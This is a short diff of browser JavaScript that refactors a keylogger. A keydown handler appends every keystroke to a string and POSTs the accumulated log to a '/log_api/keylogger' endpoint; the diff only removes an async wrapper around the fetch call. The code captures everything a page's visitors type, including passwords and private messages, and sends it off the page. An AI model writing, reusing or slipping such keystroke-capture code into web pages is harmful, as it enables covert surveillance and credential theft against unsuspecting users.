@@ -9,7 +9,6 @@ loggingData = ""
 
 document.onkeydown =async  function(event){
   loggingData +=event.key.toString();
- await  (async () => {
     const rawResponse = await fetch("/log_api/keylogger", {
       method: 'POST',
       headers: {
@@ -18,7 +17,6 @@ document.onkeydown =async  function(event){
       },
       body: JSON.stringify({logdata : loggingData })
     });
-  })();
 
 }
 
